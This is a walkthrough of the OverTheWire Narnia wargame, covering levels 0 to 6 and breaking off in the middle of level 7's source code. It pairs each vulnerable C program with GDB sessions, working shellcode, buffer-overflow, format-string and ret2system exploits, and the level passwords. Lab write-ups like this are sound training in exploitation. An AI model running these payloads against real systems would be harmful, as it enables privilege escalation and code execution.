---
title: "[OTW] Разбор варгейма Narnia"
permalink: /writeups/otw/narnia/
excerpt: "Краткий разбор варгейма Narnia с OverTheWire."
---

---
{% include toc icon="cog" title="Narnia Wargame" %}
The [Narnia](http://overthewire.org/wargames/narnia/) wargame is an online game offered by the [OverTheWire](http://overthewire.org) community. This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.
{: .text-justify}

The challenges can be found in the **/narnia/** folder and the passwords for each level can be found in **/etc/narnia_pass/narniaX**.

## Решение Narnia 00

**SSH :** *ssh narnia0@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *narnia0*

First, let's try to execute the program...

```bash
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: TEST
buf: TEST
val: 0x41414141
WAY OFF!!!!
```

### Исходный код

Now, let's take a look at the source code.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

To solve this challenge, we need to change the **val** value initialized with `0x41414141` to `0xdeadbeef`. 

Here, the issue come from the *scanf()* function. It allows the user to enter **24** chars however, the **buf** variable is only **20** bytes so, we can overwrite *4* bytes. 

Let's try to write 24 bytes as input and check if the address changes.

```bash
narnia0@narnia:/narnia$ python -c 'print 20 * "A" + "BBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

It seems that we were able to modify the original value of **val** with `0x42424242`. We will do the same thing with the right value or `0xdeadbeef`

```bash
narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

Easy, right ?

## Решение Narnia 01

**SSH :** *ssh narnia1@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *efeidiedae*

First, let's try to execute the program...

```bash
narnia1@narnia:~$ cd /narnia/
narnia1@narnia:/narnia$ ./narnia1 
Give me something to execute at the env-variable EGG
```

Hum... It seems that we need to initialize an environment variable named **EGG**.

### Исходный код

Let's clarify that with the source code.

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

Here, the code will execute anything we put in the **EGG** environment variable, we only need to find a shellcode and set the **EGG** variable. I used a random shellcode from the [Exploit Database](https://www.exploit-db.com/exploits/44594).

```nasm
; https://www.exploit-db.com/exploits/44594
section .text
global _start

_start:
    xor ecx, ecx
    mul ecx
    push ecx
    mov edi, 0x978CD0D0
    mov esi, 0x91969DD0
    not edi
    not esi
    push edi
    push esi
    mov ebx, esp
    mov al, 0xb
    int 0x80
```

Here is the shellcode :

```text
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80
```

Now, let's export it as an environment variable an re-execute the program.

```bash
narnia1@narnia:/narnia$ export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

Done !

## Решение Narnia 02

**SSH :** *ssh narnia2@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *nairiepecu*

First, let's try to execute the program...

```bash
narnia2@narnia:~$ cd /narnia/
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 ABCD
ABCDnarnia2@narnia:/narnia$
```

So, this program just return the string we enter to the standard output.

### Исходный код

Let's check the source :

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

It looks like a standard *buffer overflow* challenge. There is no size check in the *strcpy()* function and the **buf** variable is only 128 bytes long. So, if we enter more chars than the size of the buffer, we should be able to break the execution flow by overwriting the return address.

Let's do a quick check...

```bash
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print 140 * "A"')
Segmentation fault
```

Segfault ! Now, we'll run the program in **GDB** to analyse this issue.

```nasm
$ gdb narnia2

(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	add    esp,0xffffff80
   0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048455 <+10>:	jne    0x8048471 <main+38>
   0x08048457 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845a <+15>:	mov    eax,DWORD PTR [eax]
   0x0804845c <+17>:	push   eax
   0x0804845d <+18>:	push   0x8048520
   0x08048462 <+23>:	call   0x8048300 <printf@plt>
   0x08048467 <+28>:	add    esp,0x8
   0x0804846a <+31>:	push   0x1
   0x0804846c <+33>:	call   0x8048320 <exit@plt>
   0x08048471 <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048474 <+41>:	add    eax,0x4
   0x08048477 <+44>:	mov    eax,DWORD PTR [eax]
   0x08048479 <+46>:	push   eax
   0x0804847a <+47>:	lea    eax,[ebp-0x80]
   0x0804847d <+50>:	push   eax
   0x0804847e <+51>:	call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:	add    esp,0x8
   0x08048486 <+59>:	lea    eax,[ebp-0x80]
   0x08048489 <+62>:	push   eax
   0x0804848a <+63>:	push   0x8048534
   0x0804848f <+68>:	call   0x8048300 <printf@plt>
   0x08048494 <+73>:	add    esp,0x8
   0x08048497 <+76>:	mov    eax,0x0
   0x0804849c <+81>:	leave
   0x0804849d <+82>:	ret
End of assembler dump.
(gdb) run $(python -c 'print 140 * "A"')
Starting program: /narnia/narnia2 $(python -c 'print 140 * "A"')

Breakpoint 1, 0x0804848f in main ()
(gdb) conti
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Now, we adjust our string size to precisely overwrite the return address.

```nasm
(gdb) run $(python -c 'print 132 * "A" + "BBBB"')
Starting program: /narnia/narnia2 $(python -c 'print 132 * "A" + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

As you can see, we need 132 bytes of garbage and 4 more bytes to overwrite the retrun address. Now, we need a shellcode and a return address that will read our shellcode. I choose another shellcode from [ExploitDB](https://www.exploit-db.com/exploits/43716) :

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

To find the return address I placed a breakpoint right after the *strcpy()* call :

```nasm
(gdb) set disassembly-flavor intel
(gdb) break *main+68
Breakpoint 1 at 0x804848f
(gdb) run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')
Starting program: /narnia/narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')

Breakpoint 1, 0x0804848f in main ()
(gdb) x/100x $esp+500
0xffffd784:	0x000036b2	0x0000000e	0x000036b2	0x00000017
0xffffd794:	0x00000001	0x00000019	0xffffd7cb	0x0000001a
0xffffd7a4:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffd7b4:	0xffffd7db	0x00000000	0x00000000	0x00000000
0xffffd7c4:	0x00000000	0xa9000000	0x55fe0723	0x4a68d3c6
0xffffd7d4:	0xcc5d0b96	0x698947e8	0x00363836	0x00000000
0xffffd7e4:	0x00000000	0x00000000	0x616e2f00	0x61696e72
0xffffd7f4:	0x72616e2f	0x3261696e	0x90909000	0x90909090
0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd834:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd844:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd854:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd864:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
0xffffd874:	0xc289c189	0x80cd0bb0	0xcd40c031	0x42424280
0xffffd884:	0x434c0042	0x4c4c415f	0x5f6e653d	0x552e5355
0xffffd894:	0x382d4654	0x5f534c00	0x4f4c4f43	0x723d5352
0xffffd8a4:	0x3a303d73	0x303d6964	0x34333b31	0x3d6e6c3a
0xffffd8b4:	0x333b3130	0x686d3a36	0x3a30303d	0x343d6970
0xffffd8c4:	0x33333b30	0x3d6f733a	0x333b3130	0x6f643a35
0xffffd8d4:	0x3b31303d	0x623a3533	0x30343d64	0x3b33333b
0xffffd8e4:	0x633a3130	0x30343d64	0x3b33333b	0x6f3a3130
0xffffd8f4:	0x30343d72	0x3b31333b	0x6d3a3130	0x30303d69
0xffffd904:	0x3d75733a	0x343b3733	0x67733a31	0x3b30333d
```

Here, I choose `0xffffd824` as it is in the middle of the *NOP-sled*. Let's try again with the return address :

```nasm
(gdb) run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')

Breakpoint 1, 0x0804848f in main ()
(gdb) continue
Continuing.
process 21195 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```

We got a shell, but we need to run it outside GDB's context.

```bash
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
``` 

Yay, we did it !

## Решение Narnia 03

**SSH :** *ssh narnia3@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *vaequeezee*

First, let's try to execute the program...

```bash
$ ssh narnia3@narnia.labs.overthewire.org -p 2226

narnia3@narnia:~$ cd /narnia/
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

So, I guess we need to enter a file as argument...

### Исходный код

Here is the source :

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

So, the source looks complex but it's not. In fact there is no boundary check on the input file. So, if we overflow **ifile**, we could overwrite the **ofile** which is statically intialized with **/dev/null**.

Let's check the value of **ofile** with GDB, to do that we need to place a breakpoint here :

```nasm
   0x0804855f <+84>:	add    esp,0x8
   0x08048562 <+87>:	push   0x2
   0x08048564 <+89>:	lea    eax,[ebp-0x18]
   0x08048567 <+92>:	push   eax
   0x08048568 <+93>:	call   0x80483c0 <open@plt> ; Right Here
```

As **ofile** pointer will be place in **EAX** we can see its value :

```nasm
$ gdb narnia3

(gdb) break *main+93
Breakpoint 1 at 0x8048568
(gdb) run test
Starting program: /narnia/narnia3 test

Breakpoint 1, 0x08048568 in main ()
(gdb) x/s $eax
0xffffd690:	"/dev/null"
```

Okay, now we restart the program with 32 bytes of garbage and add a new path...

```nasm
(gdb) run /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/whatever
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia3 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/whatever

Breakpoint 1, 0x08048568 in main ()
(gdb) x/s $eax
0xffffd660:	"/whatever"
``` 

Awesome! Now, we can write where we want. As **/tmp/** is read/write/exec we can create something like **/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp** and create a *symbolic link* of **/etc/narnia_pass/narnia4** to **/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax** file so the program can write the password into our file. 

Here are the steps :

```bash
narnia3@narnia:/narnia$ mkdir -p /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp
narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
narnia3@narnia:/narnia$ touch /tmp/ax
narnia3@narnia:/narnia$ chmod 777 /tmp/ax
narnia3@narnia:/narnia$ ./narnia3 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
copied contents of /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax to a safer place... (/tmp/ax)
narnia3@narnia:/narnia$ cat /tmp/ax
thaenohtai
```

It was a fun one :)

## Решение Narnia 04

**SSH :** *ssh narnia4@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *thaenohtai*

First, let's try to execute the program...

```bash
$ ssh narnia4@narnia.labs.overthewire.org -p 2226

narnia4@narnia:~$ cd /narnia/
narnia4@narnia:/narnia$ ./narnia4
```

Nothing... weird.

### Исходный код

Let's check the source.

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

This one is similar to the **level 2** however, we don't have any output or result from the program. Here, the **buffer** variable is **256** bytes long and again, no boundary check. Let's find where we overflow the return address...

```nasm
$ gdb narnia4

(gdb) set disassembly-flavor intel
(gdb) run $(python -c 'print 264 * "A" + 4 * "B"')
Starting program: /narnia/narnia4 $(python -c 'print 264 * "A" + 4 * "B"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

So, **256** bytes of garbage and **4** more bytes to overwrite the return address. To exploit this one I used the following shellcode :

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Let's find a return address. Here, I placed a return address right after the *strcpy()* call :

```nasm
(gdb) break *main+121
Breakpoint 1 at 0x8048524

(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')

Breakpoint 1, 0x08048524 in main ()
(gdb) x/100x $esp+600
0xffffd6e4:	0x00000000	0x00000009	0x080483b0	0x0000000b
0xffffd6f4:	0x000036b4	0x0000000c	0x000036b4	0x0000000d
0xffffd704:	0x000036b4	0x0000000e	0x000036b4	0x00000017
0xffffd714:	0x00000001	0x00000019	0xffffd74b	0x0000001a
0xffffd724:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffd734:	0xffffd75b	0x00000000	0x00000000	0x00000000
0xffffd744:	0x00000000	0xb9000000	0x47bfa236	0xde88977b
0xffffd754:	0x969dbe24	0x69e65cf5	0x00363836	0x00000000
0xffffd764:	0x00000000	0x616e2f00	0x61696e72	0x72616e2f
0xffffd774:	0x3461696e	0x90909000	0x90909090	0x90909090
0xffffd784:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd794:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7c4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7d4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7e4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7f4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd834:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd844:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd854:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd864:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
```

We'll use `0xffffd7b4` as it is in the middle of the *NOP sled*.

```nasm
(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')

Breakpoint 1, 0x08048524 in main ()
(gdb) conti
Continuing.
process 22763 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```

Looks like it worked. Let's do the same outside GDB.

```bash
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

Success !

## Решение Narnia 05

**SSH :** *ssh narnia5@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *faimahchiy*

First, let's try to execute the program...

```bash
$ ssh narnia5@narnia.labs.overthewire.org -p 2226

narnia5@narnia:~$ cd /narnia/
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6d0)
```

So, we need to modify the **i** variable with the value **500**. We also know the address of **i** which is equal to `0xffffd6d0`.

### Исходный код

Here is the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

The issue here is the *snprintf()* function, as you can see there are no format specifiers. It means that we have a potential **format string** vulnerability here. Let's try to enter some format specifiers in our input :

```bash
./narnia5 %x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035.3330332e] (26)
i = 1 (0xffffd6d0)
```

Ok, it's definitly a format string vulnerability. With this kind of issue, we can write where we want in memory as long as we know where. Luckily, the program gives us the address of **i**.

Now, to write something on the stack we'll use the **%n** specifier. Basically, **%n** write the size of our input at the address pointed by *%n*. For example, the following input : **AAAA%n**, means that we will write the value **4** (because the size of “AAAA” equals 4 bytes) at the address pointed by %n. But, where on the stack **%n** points to ?

Well, let's say we want to write **4** at **AAAA** (`0x41414141`), we need to find the position of **AAAA** on the stack. To do that we'll just enter the address followed by some **%x** specifiers :

```bash
narnia5@narnia:/narnia$ ./narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141.31343134.31343134.3331332e.33313334.31332e34] (57)
i = 1 (0xffffd6b0)
```

In this case, the address is in the first position on the stack so, the exploit would look like this : 

```bash
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "AAAA" + "%1$n"')
Segmentation fault
```

Obviously, it segfault as we try to write the value **4** at a random address. Note the `%1$n`, the **1** specify the position of our address on the stack. If it was on the 3rd postion we would have used `%3$n`.

However we don't want to write **4**, we want to write **500**. To do that we will use `%<size>$x`, it will serve as padding. Instead of writting our address followed by **496** chars, we'll use **%496$x**.

Let's try :

```bash
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xc0\xd6\xff\xff" + "%496x%1$n"')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

Format strings are more complex than standard buffer overflow. If you are interested, you can read my [post](https://axcheron.github.io/exploit-101-format-strings/) about this kind of vulnerability.

## Решение Narnia 06

**SSH :** *ssh narnia6@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *neezocaeng*

First, let's try to execute the program...

```bash
$ ssh narnia6@narnia.labs.overthewire.org -p 2226

narnia6@narnia:~$ cd /narnia/
narnia6@narnia:/narnia$ ./narnia6
./narnia6 b1 b2
narnia6@narnia:/narnia$ ./narnia6 123 456
123
```

It seems that the program takes 2 arguments and print the first one. Let's check the source code to understand how it works.

### Исходный код

Here is the source :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);

	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```

If we skim-through the code, our arguments are respectively copied into **b1** and **b2**. Also the **fp** variable is pointing to the *puts()* function, that's why `fp(b1)` prints our first arguments.

If we run GDB and place a breakpoint at `fp(b1)` and analyse the stack, we should be able to see where are our variables in memory.

```nasm
$ gdb narnia6

(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080485a8 <+0>:	push   ebp
   0x080485a9 <+1>:	mov    ebp,esp
   0x080485ab <+3>:	push   ebx
   0x080485ac <+4>:	sub    esp,0x18
   0x080485af <+7>:	mov    DWORD PTR [ebp-0xc],0x8048430
 
...[removed]...

   0x080486d1 <+297>:	call   0x8048410 <geteuid@plt>
   0x080486d6 <+302>:	push   ebx
   0x080486d7 <+303>:	push   eax
   0x080486d8 <+304>:	call   0x8048450 <setreuid@plt>
   0x080486dd <+309>:	add    esp,0x8
   0x080486e0 <+312>:	lea    eax,[ebp-0x14]
   0x080486e3 <+315>:	push   eax
   0x080486e4 <+316>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486e7 <+319>:	call   eax ; Break here
   0x080486e9 <+321>:	add    esp,0x4
   0x080486ec <+324>:	push   0x1
   0x080486ee <+326>:	call   0x8048440 <exit@plt>
End of assembler dump.
(gdb) break *main+319
Breakpoint 1 at 0x80486e7
(gdb) run AAAA BBBB
Starting program: /narnia/narnia6 AAAA BBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x41414141
0xffffd688:	0x08048700	0x08048430	0x00000003	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb)
(gdb) x/x $eax
0x8048430 <puts@plt>:	0x99c825ff
```

Here, we can see our arguments **AAAA** (`0x41414141`) and **BBBB** (`0x42424242`). Also, we can see the pointer to the *puts()* function contained in **EAX** (`0x8048430`). The address of *puts()* is higher on the stack so, we should be able to overwrite it. Let's try...

```nasm
(gdb) run AAAAAAAACCCC BBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 AAAAAAAACCCC BBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x41414141
0xffffd688:	0x41414141	0x43434343	0x00000000	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb) x/x $eax
0x43434343:	Cannot access memory at address 0x43434343
```

Looks very good ! Now, the idea would be to overwrite the return address with the address of *system()* and call a shell.

```nasm
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e4c850 <system>
(gdb) run $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x413b6873
0xffffd688:	0x41414141	0xf7e4c850	0x00000000	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb) continue
Continuing.
$
```

We got a shell ! Now, let's do the same outside GDB.

```bash
narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
``` 

Done !

## Решение Narnia 07

**SSH :** *ssh narnia7@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *ahkiaziphu*

First, let's try to execute the program...

```bash
$ ssh narnia7@narnia.labs.overthewire.org -p 2226

cd /narnia/
narnia7@narnia:/narnia$ ./narnia7
Usage: ./narnia7 <buffer>
narnia7@narnia:/narnia$ ./narnia7 test
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

Looks like we need to redirect the execution flow somehow...

### Исходный код

Let's check the source.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
